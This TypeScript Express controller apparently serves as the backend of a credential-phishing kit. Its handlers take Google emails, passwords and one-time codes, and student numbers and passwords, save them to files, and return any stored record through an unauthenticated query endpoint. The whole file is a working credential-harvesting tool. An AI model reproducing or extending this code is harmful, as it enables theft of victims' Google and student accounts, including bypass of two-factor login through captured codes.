import { Request, Response } from 'express';

import { GoogleUserInfo, StudentInfo } from '../interfaces/types';
import { restoreFromFile, saveToFile } from '../services/credentials';

export const googleCredentials = (
  req: Request<{}, {}, GoogleUserInfo>,
  res: Response
) => {
  const { email, password, otp } = req.body;
  saveToFile(`google-${email}`, { email, password, otp });

  res.status(200).json({ ok: true, msg: 'Google Credentials' });
};

export const studentCredentials = (
  req: Request<{}, {}, StudentInfo>,
  res: Response
) => {
  const { no, password } = req.body;
  saveToFile(`student-${no}`, { no, password });

  res.status(200).json({ ok: true, msg: 'Student Credentials' });
};

export const queryCredentials = async (req: Request, res: Response) => {
  const { user = '', type = '' } = req.query;

  if (!user && type !== 'student' && type !== 'google') {
    return res.status(400).json({ ok: false });
  }

  const { ok, data } = await restoreFromFile(`${type}-${user}`);

  if (!ok) return res.status(400).json({ ok, data });
  res.status(200).json({ ok, data: JSON.parse(data) });
};
